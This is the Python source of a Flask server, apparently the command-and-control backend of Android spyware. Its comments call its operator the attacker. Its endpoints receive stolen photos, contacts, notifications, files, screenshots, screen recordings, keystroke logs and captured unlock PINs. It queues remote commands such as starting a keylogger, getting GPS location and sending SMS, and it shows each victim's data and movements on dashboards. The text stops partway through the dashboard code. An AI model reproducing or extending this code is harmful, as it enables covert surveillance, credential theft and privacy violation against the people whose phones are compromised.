from flask import Flask, request, jsonify, send_from_directory, render_template, redirect, url_for
from datetime import datetime
import os
import json
import logging
import uuid
import time

app = Flask(__name__,
            static_folder='static',
            template_folder='templates')

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('script.log'),
        logging.StreamHandler()
    ]
)

# Base directory for all client data
CLIENTS_BASE_DIR = 'clients'

# Command queue for each device
command_queue = {}

# Map client IP to device ID
ip_to_device_id = {}

@app.template_filter('datetimeformat')
def datetimeformat(timestamp):
    """Convert timestamp to date string"""
    dt = datetime.fromtimestamp(timestamp / 1000)  # Convert ms to seconds
    today = datetime.now().date()
    yesterday = today.replace(day=today.day - 1)

    if dt.date() == today:
        return 'Today'
    elif dt.date() == yesterday:
        return 'Yesterday'
    else:
        return dt.strftime('%B %d, %Y')

@app.template_filter('timeformat')
def timeformat(timestamp):
    """Convert timestamp to time string"""
    dt = datetime.fromtimestamp(timestamp / 1000)
    return dt.strftime('%I:%M %p')

def get_location_stats(client_ip):
    """Get location statistics for a client"""
    locations_file = os.path.join(CLIENTS_BASE_DIR, client_ip, 'locations', 'location_history.jsonl')
    stats = {
        'total': 0,
        'today': 0,
        'last_seen': 'Never',
        'current_location': None,
        'locations_json': '[]',
        'dwell_periods': []
    }

    locations = []

    if os.path.exists(locations_file):
        with open(locations_file, 'r') as f:
            for line in f:
                try:
                    loc = json.loads(line.strip())
                    locations.append(loc)
                except:
                    continue

        stats['total'] = len(locations)

        if locations:
            # Get latest location
            latest = locations[-1]
            stats['current_location'] = {
                'lat': latest.get('latitude'),
                'lng': latest.get('longitude'),
                'accuracy': latest.get('accuracy', 0),
                'time': latest.get('timestamp', 0)
            }

            # Format last seen
            last_time = latest.get('timestamp', 0)
            if last_time:
                dt = datetime.fromtimestamp(last_time / 1000)
                stats['last_seen'] = dt.strftime('%Y-%m-%d %H:%M:%S')

            # Count today's locations
            today_start = datetime.now().replace(hour=0, minute=0, second=0, microsecond=0).timestamp() * 1000
            stats['today'] = sum(1 for loc in locations if loc.get('timestamp', 0) > today_start)

            # Calculate dwell periods (group by location)
            if len(locations) > 1:
                dwell_periods = []
                current_spot = locations[0]
                start_time = current_spot.get('timestamp', 0)

                for i in range(1, len(locations)):
                    loc = locations[i]

                    # Check if still at same spot (within ~11 meters)
                    lat1 = round(current_spot.get('latitude', 0), 4)
                    lng1 = round(current_spot.get('longitude', 0), 4)
                    lat2 = round(loc.get('latitude', 0), 4)
                    lng2 = round(loc.get('longitude', 0), 4)

                    if lat1 == lat2 and lng1 == lng2:
                        continue
                    else:
                        # Moved to new spot
                        end_time = loc.get('timestamp', 0)
                        duration_seconds = (end_time - start_time) / 1000

                        if duration_seconds > 60:  # Only show if stayed > 1 minute
                            hours = int(duration_seconds // 3600)
                            minutes = int((duration_seconds % 3600) // 60)

                            dwell_periods.append({
                                'lat': current_spot.get('latitude'),
                                'lng': current_spot.get('longitude'),
                                'start_time': datetime.fromtimestamp(start_time / 1000).strftime('%H:%M'),
                                'end_time': datetime.fromtimestamp(end_time / 1000).strftime('%H:%M'),
                                'duration': f"{hours}h {minutes}m" if hours > 0 else f"{minutes}m"
                            })

                        # Reset for new spot
                        current_spot = loc
                        start_time = loc.get('timestamp', 0)

                stats['dwell_periods'] = dwell_periods

            # Prepare locations for map (last 50 points)
            recent_locations = locations[-50:]
            stats['locations_json'] = json.dumps(recent_locations)

    return stats

# ========== EXISTING ENDPOINTS (COMPLETELY UNCHANGED) ==========

@app.route('/notifications', methods=['POST'])
def receive_notification():
    try:
        data = request.get_json()
        if not data:
            return {"error": "No data received"}, 400

        client_ip = request.remote_addr.replace('.', '_')
        logging.info(f"   NOTIFICATION from {request.remote_addr}")
        logging.info(f"   Package: {data.get('package', 'unknown')}")
        logging.info(f"   Title: {data.get('title', 'no title')}")
        logging.info(f"   Content: {data.get('content', 'no content')}")

        # Create client-specific folder structure
        client_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'notifications')
        os.makedirs(client_dir, exist_ok=True)

        # Save to file
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"notification_{timestamp}.json"
        filepath = os.path.join(client_dir, filename)

        with open(filepath, 'w') as f:
            json.dump(data, f, indent=2)

        return {"status": "received", "message": "Notification stored"}, 200

    except Exception as e:
        logging.error(f"Error processing notification: {e}")
        return {"error": str(e)}, 400

@app.route('/photos', methods=['POST'])
def upload_file():
    try:
        if 'file' not in request.files:
            return {"error": "No file part"}, 400

        file = request.files['file']
        if file.filename == '':
            return {"error": "No selected file"}, 400

        client_ip = request.remote_addr.replace('.', '_')

        # Create client-specific folder
        client_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'photos')
        os.makedirs(client_dir, exist_ok=True)

        # Use the original filename - NO TIMESTAMP APPENDED
        filename = file.filename
        filepath = os.path.join(client_dir, filename)

        # Check if it already exists
        if os.path.exists(filepath):
            logging.info(f"  SKIPPING: {filename} already exists for client {client_ip}.")
            return {"status": "ignored", "message": "File already exists"}, 200

        # Save only if it's new
        file.save(filepath)
        logging.info(f"  PHOTO UPLOAD: {filename} saved for client {client_ip}.")
        return {"status": "uploaded", "filename": filename}, 200

    except Exception as e:
        logging.error(f"Error uploading file: {e}")
        return {"error": str(e)}, 400

@app.route('/accessibility_logs', methods=['POST'])
def receive_accessibility_logs():
    try:
        data = request.get_json()
        if not data:
            return {"error": "No data received"}, 400

        client_ip = request.remote_addr.replace('.', '_')
        device_model = data.get('device_model', 'unknown')
        entries = data.get('total_entries', 0)

        logging.info(f"DATA from {request.remote_addr} | Device: {device_model} | Entries: {entries}")

        # Create client-specific folder
        client_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'logs')
        os.makedirs(client_dir, exist_ok=True)

        # Save to file
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"keystrokes_{timestamp}.json"
        filepath = os.path.join(client_dir, filename)

        with open(filepath, 'w') as f:
            json.dump(data, f, indent=2)

        return {"status": "received"}, 200

    except Exception as e:
        logging.error(f"Error processing logs: {e}")
        return {"error": str(e)}, 400

@app.route('/contacts', methods=['POST'])
def receive_contacts():
    try:
        data = request.get_json()
        if not data:
            return {"error": "No data received"}, 400

        client_ip = request.remote_addr.replace('.', '_')
        device_ip = data.get('device_ip', 'unknown')

        # Create client-specific folder
        client_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'contacts')
        os.makedirs(client_dir, exist_ok=True)

        # ONE file per device (JSON format)
        filename = f"contacts_{device_ip}.json"
        filepath = os.path.join(client_dir, filename)

        # Load existing contacts or create new list
        existing_contacts = []
        existing_ids = set()

        if os.path.exists(filepath):
            try:
                with open(filepath, 'r', encoding='utf-8') as f:
                    existing_contacts = json.load(f)
                    # Build set of existing contact_ids
                    existing_ids = set(c.get('contact_id', '') for c in existing_contacts if c.get('contact_id'))
            except:
                existing_contacts = []
                existing_ids = set()

        # Handle single contact or batch
        if data.get('type') == 'contacts_batch':
            new_contacts = data.get('contacts', [])
            added_count = 0

            for contact in new_contacts:
                contact_id = contact.get('contact_id', '')
                if contact_id and contact_id not in existing_ids:
                    contact['date_received'] = datetime.now().isoformat()
                    existing_contacts.append(contact)
                    existing_ids.add(contact_id)
                    added_count += 1
                    logging.info(f"CONTACT from {request.remote_addr} | Device IP: {device_ip} | Name: {contact.get('contact_name', 'unknown')}")

            # Save back to file
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(existing_contacts, f, indent=2, ensure_ascii=False)

            logging.info(f"CONTACTS BATCH from {request.remote_addr} | Added: {added_count} new contacts | Total: {len(existing_contacts)}")
            return {"status": "received", "contacts_added": added_count, "total": len(existing_contacts)}, 200

        # Handle individual contacts
        else:
            contact_id = data.get('contact_id', '')

            # Check if contact already exists
            if contact_id not in existing_ids:
                data['date_received'] = datetime.now().isoformat()
                existing_contacts.append(data)
                existing_ids.add(contact_id)

                with open(filepath, 'w', encoding='utf-8') as f:
                    json.dump(existing_contacts, f, indent=2, ensure_ascii=False)

                logging.info(f"CONTACT from {request.remote_addr} | Device IP: {device_ip} | Name: {data.get('contact_name', 'unknown')}")
            else:
                logging.info(f"CONTACT from {request.remote_addr} | Device IP: {device_ip} | Contact {contact_id} already exists, skipping")

            return {"status": "received"}, 200

    except Exception as e:
        logging.error(f"Error processing contacts: {e}")
        return {"error": str(e)}, 400

@app.route('/downloads', methods=['POST'])
def receive_downloads():
    try:
        if 'file' not in request.files:
            return {"error": "No file part"}, 400

        file = request.files['file']
        if file.filename == '':
            return {"error": "No selected file"}, 400

        # Get device info from form data
        client_ip = request.remote_addr.replace('.', '_')
        device_id = request.form.get('device_id', 'unknown')
        device_model = request.form.get('device_model', 'unknown')
        file_path = request.form.get('file_path', 'unknown')
        file_size = request.form.get('file_size', 'unknown')
        folder = request.form.get('folder', 'Download')

        logging.info(f"  DOWNLOAD from {device_model} ({device_id})")
        logging.info(f"  File: {file.filename}")
        logging.info(f"  Size: {file_size} bytes")
        logging.info(f"  Original path: {file_path}")

        # Create client-specific folder inside downloads - now under client IP
        client_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'downloads')
        os.makedirs(client_dir, exist_ok=True)

        # Save with original filename, add timestamp if duplicate
        filename = file.filename
        filepath = os.path.join(client_dir, filename)

        # Handle duplicate filenames
        counter = 1
        while os.path.exists(filepath):
            name, ext = os.path.splitext(filename)
            filepath = os.path.join(client_dir, f"{name}_{counter}{ext}")
            counter += 1

        file.save(filepath)
        logging.info(f"  SAVED: {os.path.basename(filepath)} for client {client_ip}")

        return {
            "status": "uploaded",
            "filename": os.path.basename(filepath),
            "device_id": device_id
        }, 200

    except Exception as e:
        logging.error(f"Error uploading download: {e}")
        return {"error": str(e)}, 400

@app.route('/pin_logs', methods=['POST'])
def receive_pin_logs():
    try:
        data = request.get_json()
        if not data:
            return {"error": "No data received"}, 400

        client_ip = request.remote_addr.replace('.', '_')
        device_model = data.get('device_model', 'unknown')
        entries = data.get('total_entries', 0)

        logging.info(f"PIN DATA from {request.remote_addr} | Device: {device_model} | Entries: {entries}")

        # Create client-specific folder
        client_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'pin_logs')
        os.makedirs(client_dir, exist_ok=True)

        # Use a single master file for all PIN attempts
        master_file = os.path.join(client_dir, "all_pins.json")

        # Load existing PINs or create new list
        all_pins = []
        if os.path.exists(master_file):
            try:
                with open(master_file, 'r', encoding='utf-8') as f:
                    all_pins = json.load(f)
            except:
                all_pins = []

        # Extract PIN attempts from the incoming data
        if 'pin_logs' in data:
            pin_entries = data.get('pin_logs', [])

            # Process each PIN entry
            for i, log_entry in enumerate(pin_entries):
                # Parse log line like "12:29:36 - PIN_SUBMITTED: 563785"
                parts = log_entry.split(' - ')
                if len(parts) == 2:
                    time = parts[0]
                    message = parts[1]

                    if 'PIN_SUBMITTED:' in message:
                        pin = message.replace('PIN_SUBMITTED:', '').strip()

                        # The LAST PIN in the batch is the successful one
                        # All previous ones in this batch are failed attempts
                        is_success = (i == len(pin_entries) - 1)

                        all_pins.append({
                            'timestamp': time,
                            'pin': pin,
                            'status': 'success' if is_success else 'fail',
                            'date_received': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                        })

        # Save back to master file
        with open(master_file, 'w', encoding='utf-8') as f:
            json.dump(all_pins, f, indent=2)

        # Delete individual JSON files to keep clean
        for file in os.listdir(client_dir):
            if file.endswith('.json') and file != 'all_pins.json':
                try:
                    os.remove(os.path.join(client_dir, file))
                except:
                    pass

        return {"status": "received"}, 200

    except Exception as e:
        logging.error(f"Error processing PIN logs: {e}")
        return {"error": str(e)}, 400

# ========== VIDEO ENDPOINT ==========

@app.route('/videos', methods=['POST'])
def receive_video():
    """Receive video uploads from camera recording"""
    try:
        if 'file' not in request.files:
            return {"error": "No file part"}, 400

        file = request.files['file']
        if file.filename == '':
            return {"error": "No selected file"}, 400

        client_ip = request.remote_addr.replace('.', '_')
        device_id = request.form.get('device_id', 'unknown')
        device_model = request.form.get('device_model', 'unknown')
        file_size = request.form.get('file_size', 'unknown')
        video_type = request.form.get('type', 'unknown')

        logging.info(f"  VIDEO from {device_model} ({device_id})")
        logging.info(f"  Type: {video_type}")
        logging.info(f"  File: {file.filename}")
        logging.info(f"  Size: {file_size} bytes")

        # Create client-specific folder
        client_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'videos')
        os.makedirs(client_dir, exist_ok=True)

        # Save with original filename
        filename = file.filename
        filepath = os.path.join(client_dir, filename)

        # Handle duplicates
        counter = 1
        while os.path.exists(filepath):
            name, ext = os.path.splitext(filename)
            filepath = os.path.join(client_dir, f"{name}_{counter}{ext}")
            counter += 1

        file.save(filepath)
        logging.info(f"  VIDEO SAVED: {os.path.basename(filepath)}")

        return {
            "status": "uploaded",
            "filename": os.path.basename(filepath),
            "device_id": device_id,
            "file_size": file_size
        }, 200

    except Exception as e:
        logging.error(f"Error uploading video: {e}")
        return {"error": str(e)}, 400

@app.route('/screen_recordings', methods=['POST'])
def receive_screen_recording():
    """Receive screen recording uploads from camera detection"""
    try:
        if 'file' not in request.files:
            return {"error": "No file part"}, 400

        file = request.files['file']
        if file.filename == '':
            return {"error": "No selected file"}, 400

        client_ip = request.remote_addr.replace('.', '_')
        device_id = request.form.get('device_id', 'unknown')
        device_model = request.form.get('device_model', 'unknown')
        file_size = request.form.get('file_size', 'unknown')
        recording_type = request.form.get('type', 'screen_recording')

        logging.info(f"  SCREEN RECORDING from {device_model} ({device_id})")
        logging.info(f"  Type: {recording_type}")
        logging.info(f"  File: {file.filename}")
        logging.info(f"  Size: {file_size} bytes")

        # Create client-specific folder for screen recordings
        client_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'screen_recordings')
        os.makedirs(client_dir, exist_ok=True)

        # Save with original filename
        filename = file.filename
        filepath = os.path.join(client_dir, filename)

        # Handle duplicates
        counter = 1
        while os.path.exists(filepath):
            name, ext = os.path.splitext(filename)
            filepath = os.path.join(client_dir, f"{name}_{counter}{ext}")
            counter += 1

        file.save(filepath)
        logging.info(f"  SCREEN RECORDING SAVED: {os.path.basename(filepath)}")

        return {
            "status": "uploaded",
            "filename": os.path.basename(filepath),
            "device_id": device_id,
            "file_size": file_size
        }, 200

    except Exception as e:
        logging.error(f"Error uploading screen recording: {e}")
        return {"error": str(e)}, 400

@app.route('/client/<client_ip>/pin_logs')
def view_client_pins(client_ip):
    """View PIN unlocks with success/fail status"""
    pin_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'pin_logs')
    master_file = os.path.join(pin_dir, "all_pins.json")

    pins = []
    stats = {'total': 0, 'success': 0, 'fail': 0}

    if os.path.exists(master_file):
        try:
            with open(master_file, 'r', encoding='utf-8') as f:
                pins = json.load(f)

            # Calculate stats based on status
            stats['total'] = len(pins)

            # Count successes and failures
            success_pins = [p for p in pins if p.get('status') == 'success']
            fail_pins = [p for p in pins if p.get('status') == 'fail']

            stats['success'] = len(success_pins)
            stats['fail'] = len(fail_pins)

        except Exception as e:
            logging.error(f"Error loading PINs: {e}")
            pins = []

    return render_template('pin_view.html',
                         client_ip=client_ip,
                         device_id=ip_to_device_id.get(client_ip, 'unknown'),
                         pins=pins,
                         stats=stats)

@app.route('/client/<client_ip>/pin_logs/update_status', methods=['POST'])
def update_pin_status(client_ip):
    """Update the status of a PIN attempt"""
    try:
        data = request.get_json()
        index = data.get('index')
        status = data.get('status')

        pin_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'pin_logs')
        master_file = os.path.join(pin_dir, "all_pins.json")

        if os.path.exists(master_file):
            with open(master_file, 'r', encoding='utf-8') as f:
                pins = json.load(f)

            if 0 <= index < len(pins):
                pins[index]['status'] = status

                with open(master_file, 'w', encoding='utf-8') as f:
                    json.dump(pins, f, indent=2)

                return jsonify({'success': True}), 200

        return jsonify({'success': False}), 400

    except Exception as e:
        logging.error(f"Error updating PIN status: {e}")
        return jsonify({'success': False}), 400

@app.route('/videos/<client_ip>/<filename>')
def serve_video(client_ip, filename):
    """Serve video files for viewing in gallery"""
    client_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'videos')
    return send_from_directory(client_dir, filename)

# ========== C2 COMMAND ENDPOINTS ==========

@app.route('/screenshots', methods=['POST'])
def receive_screenshot():
    """Receive screenshot uploads from the phone"""
    try:
        if 'file' not in request.files:
            return {"error": "No file part"}, 400

        file = request.files['file']
        if file.filename == '':
            return {"error": "No selected file"}, 400

        client_ip = request.remote_addr.replace('.', '_')
        device_id = request.form.get('device_id', 'unknown')
        device_model = request.form.get('device_model', 'unknown')
        timestamp = request.form.get('timestamp', str(datetime.now().timestamp()))
        resolution = request.form.get('screen_resolution', 'unknown')

        logging.info(f"  SCREENSHOT from {device_model} ({device_id})")
        logging.info(f"  Resolution: {resolution}")

        # Create client-specific folder
        client_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'screenshots')
        os.makedirs(client_dir, exist_ok=True)

        # Save with original filename
        filename = file.filename
        filepath = os.path.join(client_dir, filename)

        # Handle duplicates
        counter = 1
        while os.path.exists(filepath):
            name, ext = os.path.splitext(filename)
            filepath = os.path.join(client_dir, f"{name}_{counter}{ext}")
            counter += 1

        file.save(filepath)
        logging.info(f"  SCREENSHOT SAVED: {os.path.basename(filepath)}")

        return {
            "status": "uploaded",
            "filename": os.path.basename(filepath),
            "device_id": device_id
        }, 200

    except Exception as e:
        logging.error(f"Error uploading screenshot: {e}")
        return {"error": str(e)}, 400

# UPDATED: /commands GET endpoint with mapping
@app.route('/commands', methods=['GET'])
def get_commands():
    """Phone polls this endpoint to get pending commands"""
    try:
        # Get device_id from query parameters
        device_id = request.args.get('device_id')

        if not device_id:
            return {"error": "device_id required"}, 400

        # Store mapping between client IP and device ID
        client_ip = request.remote_addr.replace('.', '_')
        ip_to_device_id[client_ip] = device_id
        logging.info(f"  POLL from IP {client_ip} -> Device ID {device_id}")

        # Get pending commands for this device
        device_commands = command_queue.get(device_id, [])

        # Debug: Show what's in the queue for this device
        logging.info(f"  Queue for {device_id}: {len(device_commands)} commands pending")
        if device_commands:
            logging.info(f"  First command in queue: {device_commands[0].get('command')}")

        if device_commands:
            # Return the next command (FIFO)
            next_command = device_commands.pop(0)
            logging.info(f"  >>> SENDING COMMAND to {device_id}: {next_command.get('command')}")
            logging.info(f"  >>> Command data: {next_command}")
            return jsonify(next_command)
        else:
            # No commands pending
            logging.info(f"  No commands for {device_id}")
            return jsonify({})

    except Exception as e:
        logging.error(f"Error getting commands: {e}")
        return {"error": str(e)}, 400

@app.route('/commands', methods=['POST'])
def add_command():
    """Attacker uses this to add commands for a specific device"""
    try:
        data = request.get_json()

        if not data:
            return {"error": "No data received"}, 400

        device_id = data.get('device_id')
        command = data.get('command')
        params = data.get('params', {})

        if not device_id or not command:
            return {"error": "device_id and command required"}, 400

        # Generate unique command ID
        command_id = str(uuid.uuid4())

        # Create command object
        command_data = {
            'command_id': command_id,
            'command': command,
            'params': params,
            'timestamp': datetime.now().isoformat()
        }

        # Add to queue for this device
        if device_id not in command_queue:
            command_queue[device_id] = []

        command_queue[device_id].append(command_data)

        # IMPORTANT: Log the entire command queue state
        logging.info(f"  COMMAND ADDED for {device_id}: {command}")
        logging.info(f"  Command ID: {command_id}")
        logging.info(f"  Current queue for {device_id}: {len(command_queue[device_id])} commands")
        logging.info(f"  All device queues: {list(command_queue.keys())}")

        if params:
            logging.info(f"    Params: {params}")

        return jsonify({
            'status': 'queued',
            'command_id': command_id,
            'device_id': device_id
        }), 200

    except Exception as e:
        logging.error(f"Error adding command: {e}")
        return {"error": str(e)}, 400

@app.route('/commands/ack', methods=['POST'])
def command_ack():
    """Phone sends acknowledgment that command was completed"""
    try:
        data = request.get_json()

        if not data:
            return {"error": "No data received"}, 400

        device_id = data.get('device_id')
        command_id = data.get('command_id')
        status = data.get('status', 'completed')
        result = data.get('result', {})

        logging.info(f"  COMMAND ACK from {device_id}")
        logging.info(f"    Command ID: {command_id}")
        logging.info(f"    Status: {status}")

        # Store command result in client folder
        client_ip = request.remote_addr.replace('.', '_')
        client_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'command_results')
        os.makedirs(client_dir, exist_ok=True)

        # Save result
        filename = f"command_{command_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        filepath = os.path.join(client_dir, filename)

        with open(filepath, 'w') as f:
            json.dump({
                'device_id': device_id,
                'command_id': command_id,
                'status': status,
                'result': result,
                'timestamp': datetime.now().isoformat()
            }, f, indent=2)

        return jsonify({'status': 'received'}), 200

    except Exception as e:
        logging.error(f"Error processing command ack: {e}")
        return {"error": str(e)}, 400

@app.route('/commands/status/<device_id>', methods=['GET'])
def check_command_status(device_id):
    """Check pending commands and results for a device"""
    try:
        pending = len(command_queue.get(device_id, []))

        # Get recent results
        results = []
        client_ip = None

        # Find client IP from device_id (you might need a mapping)
        for ip in os.listdir(CLIENTS_BASE_DIR):
            results_dir = os.path.join(CLIENTS_BASE_DIR, ip, 'command_results')
            if os.path.exists(results_dir):
                for result_file in os.listdir(results_dir):
                    if device_id in result_file:
                        results.append(result_file)

        return jsonify({
            'device_id': device_id,
            'pending_commands': pending,
            'recent_results': results[-10:]  # Last 10 results
        }), 200

    except Exception as e:
        logging.error(f"Error checking status: {e}")
        return {"error": str(e)}, 400

@app.route('/commands/list', methods=['GET'])
def list_available_commands():
    """List all available commands that can be sent"""
    commands = {
        'START_SCREENSHOT': {
            'description': 'Start periodic screenshot capture (every 5 seconds)',
            'params': {}
        },
        'STOP_SCREENSHOT': {
            'description': 'Stop periodic screenshot capture',
            'params': {}
        },
        'CAPTURE_NOW': {
            'description': 'Capture a single screenshot immediately',
            'params': {}
        },
        'REQUEST_SCREEN_CAPTURE': {
            'description': 'Request screen capture permission',
            'params': {}
        },
        'GET_PHOTOS': {
            'description': 'Upload all new photos',
            'params': {}
        },
        'GET_CONTACTS': {
            'description': 'Upload all contacts',
            'params': {}
        },
        'GET_DOWNLOADS': {
            'description': 'Upload files from Downloads folder',
            'params': {}
        },
        'UPLOAD_LOGS': {
            'description': 'Upload accessibility and PIN logs',
            'params': {}
        },
        'START_KEYLOGGER': {
            'description': 'Start keylogger',
            'params': {'duration': 'Optional: duration in seconds'}
        },
        'STOP_KEYLOGGER': {
            'description': 'Stop keylogger',
            'params': {}
        },
        'GET_LOCATION': {
            'description': 'Get current GPS location',
            'params': {}
        },
        'SEND_SMS': {
            'description': 'Send an SMS',
            'params': {
                'number': 'Phone number to send to',
                'message': 'Message content'
            }
        }
    }
    return jsonify(commands), 200

# ========== UI ENDPOINTS ==========

@app.route('/photos/<client_ip>/<filename>')
def serve_photo(client_ip, filename):
    client_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'photos')
    return send_from_directory(client_dir, filename)

@app.route('/screenshots/<client_ip>/<filename>')
def serve_screenshot(client_ip, filename):
    client_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'screenshots')
    return send_from_directory(client_dir, filename)

# UPDATED: Main index endpoint with mapping
@app.route('/')
def index():
    """Main dashboard"""
    # Get client statistics
    clients = []
    client_stats = {}

    if os.path.exists(CLIENTS_BASE_DIR):
        for client_ip in os.listdir(CLIENTS_BASE_DIR):
            stats = {
                'photos': 0,
                'screenshots': 0,
                'videos': 0,
                'sms': 0,
                'calls': 0,
                'pin_logs': 0,
                'last_seen': None
            }

            # Count files in each directory
            photos_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'photos')
            if os.path.exists(photos_dir):
                stats['photos'] = len(os.listdir(photos_dir))

            screenshots_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'screenshots')
            if os.path.exists(screenshots_dir):
                stats['screenshots'] = len(os.listdir(screenshots_dir))

            videos_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'videos')
            if os.path.exists(videos_dir):
                stats['videos'] = len(os.listdir(videos_dir))

            sms_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'sms')
            if os.path.exists(sms_dir):
                stats['sms'] = len(os.listdir(sms_dir))

            calls_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'call_logs')
            if os.path.exists(calls_dir):
                stats['calls'] = len(os.listdir(calls_dir))

            pin_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'pin_logs')
            if os.path.exists(pin_dir):
                stats['pin_logs'] = len(os.listdir(pin_dir))

            # Get last activity
            latest_time = 0
            for root, dirs, files in os.walk(os.path.join(CLIENTS_BASE_DIR, client_ip)):
                for file in files:
                    filepath = os.path.join(root, file)
                    mtime = os.path.getmtime(filepath)
                    if mtime > latest_time:
                        latest_time = mtime

            if latest_time > 0:
                stats['last_seen'] = datetime.fromtimestamp(latest_time).strftime('%Y-%m-%d %H:%M:%S')

            client_stats[client_ip] = stats
            clients.append(client_ip)

    return render_template('index.html',
                         clients=clients,
                         client_stats=client_stats,
                         ip_to_device_id=ip_to_device_id)  # Pass mapping to template

@app.route('/gallery')
def gallery():
    """Media gallery view"""
    clients = []
    client_photos = {}
    client_screenshots = {}
    client_videos = {}
    client_screen_recordings = {}
    import re

    if os.path.exists(CLIENTS_BASE_DIR):
        for client_ip in os.listdir(CLIENTS_BASE_DIR):
            # Photos
            photos_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'photos')
            if os.path.exists(photos_dir):
                photos = os.listdir(photos_dir)
                # Sort by date in filename (newest first)
                file_with_date = []
                for f in photos:
                    date_match = re.search(r'(\d{8})', f)
                    if date_match:
                        date_str = date_match.group(1)
                        date_num = int(date_str)
                        file_with_date.append((f, date_num))
                    else:
                        file_with_date.append((f, 0))
                file_with_date.sort(key=lambda x: x[1], reverse=True)
                photos = [f[0] for f in file_with_date]
                client_photos[client_ip] = photos[:50]

            # Screenshots
            screenshots_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'screenshots')
            if os.path.exists(screenshots_dir):
                screenshots = os.listdir(screenshots_dir)
                # Sort by date in filename (newest first)
                file_with_date = []
                for f in screenshots:
                    date_match = re.search(r'(\d{8})', f)
                    if date_match:
                        date_str = date_match.group(1)
                        date_num = int(date_str)
                        file_with_date.append((f, date_num))
                    else:
                        file_with_date.append((f, 0))
                file_with_date.sort(key=lambda x: x[1], reverse=True)
                screenshots = [f[0] for f in file_with_date]
                client_screenshots[client_ip] = screenshots[:50]

            # Regular Videos (from gallery)
            videos_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'videos')
            if os.path.exists(videos_dir):
                videos = os.listdir(videos_dir)
                # Sort by date in filename (newest first)
                file_with_date = []
                for f in videos:
                    date_match = re.search(r'(\d{8})', f)
                    if date_match:
                        date_str = date_match.group(1)
                        date_num = int(date_str)
                        file_with_date.append((f, date_num))
                    else:
                        file_with_date.append((f, 0))
                file_with_date.sort(key=lambda x: x[1], reverse=True)
                videos = [f[0] for f in file_with_date]
                client_videos[client_ip] = videos[:50]

            # Screen Recordings (C2 videos)
            screen_recordings_dir = os.path.join(CLIENTS_BASE_DIR, client_ip, 'screen_recordings')
            if os.path.exists(screen_recordings_dir):
                screen_recordings = os.listdir(screen_recordings_dir)
                # Sort by date in filename (newest first)
                file_with_date = []
                for f in screen_recordings:
                    date_match = re.search(r'(\d{8})', f)
                    if date_match:
                        date_str = date_match.group(1)
                        date_num = int(date_str)
                        file_with_date.append((f, date_num))
                    else:
                        file_with_date.append((f, 0))
                file_with_date.sort(key=lambda x: x[1], reverse=True)
                screen_recordings = [f[0] for f in file_with_date]
                client_screen_recordings[client_ip] = screen_recordings[:50]

            clients.append(client_ip)

    return render_template('gallery.html',
                         clients=clients,
                         client_photos=client_photos,
                         client_screenshots=client_screenshots,
                         client_videos=client_videos,
                         client_screen_recordings=client_screen_recordings)

@app.route('/client/<client_ip>')
def client_dashboard(client_ip):
    """Client-specific dashboard"""
    client_dir = os.path.join(CLIENTS_BASE_DIR, client_ip)

    if not os.path.exists(client_dir):
        return f"Client {client_ip} not found", 404

    # Gather all data types
    data_types = {}
    data_counts = {}
    contacts_list = []
    call_logs_list = []
    pin_logs_list = []
    file_previews = {}
    import re
    from datetime import datetime

    for data_type in ['notifications', 'photos', 'screenshots', 'videos', 'screen_recordings',
                      'logs', 'contacts', 'downloads', 'pin_logs',
                      'sms', 'call_logs', 'locations']:
        type_dir = os.path.join(client_dir, data_type)
        if os.path.exists(type_dir):
            files = os.listdir(type_dir)

            # Sort photos, screenshots, and videos by timestamp in filename (newest first)
            if data_type in ['photos', 'screenshots', 'videos']:
                file_with_time = []
                for f in files:
                    filepath = os.path.join(type_dir, f)

                    # Try to find full timestamp pattern YYYYMMDD_HHMMSS or YYYYMMDD-HHMMSS
                    time_match = re.search(r'(\d{8})[_-]?(\d{6})?', f)
                    if time_match:
                        date_str = time_match.group(1)
                        time_str = time_match.group(2) if len(time_match.groups()) > 1 else "000000"
                        try:
                            # Convert to a sortable integer (YYYYMMDDHHMMSS)
                            timestamp_num = int(date_str + time_str)
                            file_with_time.append((f, timestamp_num))
                        except:
                            # If parsing fails, use file modification time as fallback
                            mtime = os.path.getmtime(filepath)
                            file_with_time.append((f, mtime))
                    else:
                        # If no timestamp found, use file modification time
                        mtime = os.path.getmtime(filepath)
                        file_with_time.append((f, mtime))

                # Sort by timestamp (newest first - larger number = newer)
                file_with_time.sort(key=lambda x: x[1], reverse=True)
                files = [f[0] for f in file_with_time]

                # Extract timestamps for file_previews
                for f in files:
                    filepath = os.path.join(type_dir, f)
                    if os.path.exists(filepath):
                        timestamp = 0

                        # Try to extract from PXL_YYYYMMDD_HHMMSS format
                        pxl_match = re.search(r'PXL_(\d{4})(\d{2})(\d{2})_(\d{2})(\d{2})(\d{2})', f)
                        if pxl_match:
